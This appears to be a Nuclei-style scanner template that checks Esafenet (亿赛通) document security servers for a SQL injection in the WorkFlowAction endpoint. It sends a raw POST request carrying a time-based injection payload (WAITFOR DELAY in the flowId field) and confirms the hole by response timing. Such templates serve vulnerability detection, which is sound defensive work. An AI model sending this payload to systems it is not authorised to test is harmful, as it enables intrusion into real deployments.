id: poc-yaml-yisaitong-esafenet-workflowaction-sqli
info:
  name: 亿赛通电子文档安全管理系统 WorkFlowAction SQL注入漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection
  description: |
    检测亿赛通电子文档安全管理系统 WorkFlowAction 功能中的 SQL 注入漏洞。

variables:
  t1: "{{rand_int(5,10)}}"
  t2: "{{to_number(t1) + 2}}"

http:
  - raw:
      - |
        POST /CDGServer3/3g/WorkFlowAction;Servicelogin HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        command=Approval&userId=1&fromurl=getTodoList.jsp?curpage=111&flowId=111'%3bWAITFOR+DELAY+'0%3a0%3a{{t1}}'--
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 302
      - type: word
        part: header
        words:
          - "Location: index.jsp"
          - "Path=/CDGServer3"
      - type: word
        part: body
        words:
          - ""
      - type: dsl
        dsl:
          - duration > t1 && duration < t2
